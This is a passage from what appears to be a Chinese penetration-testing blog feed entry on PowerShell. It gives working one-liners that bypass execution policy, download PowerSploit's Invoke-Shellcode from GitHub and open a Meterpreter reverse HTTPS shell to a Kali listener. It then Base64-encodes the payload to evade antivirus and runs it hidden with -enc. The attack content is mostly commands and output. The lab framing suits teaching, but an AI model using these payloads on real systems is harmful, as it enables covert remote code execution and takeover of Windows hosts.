src="/2020/02/18/Windows-PowerShell基础/5.png" alt=""></p><p>因此，最终构造如下payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonI IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">10.137</span> -Lport <span class="number">666</span></span><br></pre></td></tr></table></figure><p>先在Kali上打开MSF，使用后门模块<code>exploit/multi/handler</code>，并选择payload为<code>windows/meterpreter/reverse_https</code>，接着设置监听地址和端口后启动监听：</p><p><img src="/2020/02/18/Windows-PowerShell基础/6.png" alt=""></p><p>然后在Win10中的PowerShell中输入payload，发现会报如下错误：</p><p><img src="/2020/02/18/Windows-PowerShell基础/7.png" alt=""></p><p>此时msf是接收到反弹的请求的，但是并不会成功获得反弹的Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/8.png" alt=""></p><p>那我们换个环境，在Win7上测试一下，经过几番折腾，去掉几个payload的参数就能成功执行反弹shell（注意，在cmd命令行下双引号要改为单引号，不然报错）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -NoProfile IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">10.137</span> -Lport <span class="number">666</span></span><br></pre></td></tr></table></figure><p>直接在win7的cmd中输入payload：</p><p><img src="/2020/02/18/Windows-PowerShell基础/9.png" alt=""></p><p>此时在Kali的msf中成功获取到Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/10.png" alt=""></p><p>这里注意，不能直接在win7的PowerShell终端输入该payload，会显示如下错误：</p><p><img src="/2020/02/18/Windows-PowerShell基础/11.png" alt=""></p><p>这可能是win7和win10的PowerShell版本不一致导致的某些差异，具体原因还未知，但我们可以使用如下形式在win7的PowerShell终端来执行反弹shell，简单地说就是设置执行策略为无限制，然后直接远程下载恶意PowerShell脚本并执行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted; IEX(<span class="built_in">New-object</span> Net.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">10.137</span> -Lport <span class="number">666</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/18/Windows-PowerShell基础/12.png" alt=""></p><p>在msf中同样获取到反弹shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/13.png" alt=""></p><h4 id="使用Base64对PowerShell命令进行编码"><a href="#使用Base64对PowerShell命令进行编码" class="headerlink" title="使用Base64对PowerShell命令进行编码"></a>使用Base64对PowerShell命令进行编码</h4><p>使用Base64编码PowerShell命令可以起到混淆和压缩代码的作用，避免一些特殊字符导致脚本被杀毒软件所查杀。这里使用大佬写的一个Python脚本文件<a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py" target="_blank" rel="noopener">ps_encoder.py</a>，其使用Base64编码封装的PowerShell命令包，其目的是混淆和压缩代码。</p><p>该脚本编码的对象必须是文本文件，这里需要先将命令保存为文本文件，然后调用该脚本编码即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># echo "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 -Force" &gt;raw.txt</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cat raw.txt </span></span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 -Force</span><br><span class="line">root@kali:~/Desktop<span class="comment"># chmod +x ps_encoder.py </span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># python ps_encoder.py -s raw.txt</span></span><br><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA==</span><br><span class="line">root@kali:~/Desktop<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得到Base64编码后的命令内容之后，直接在目标主机的cmd终端上执行如下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -NoP -NonI -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA==</span><br></pre></td></tr></table></figure><p>这里为了看下有没有错误就不添加<code>-W Hidden</code>参数设置隐藏窗口了，而且添加了还没成功反弹shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/14.png" alt=""></p><p>然后在Kali的msf中获取到Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/15.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Windows" scheme="https://www.mi1k7ea.com/tags/Windows/"/>
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
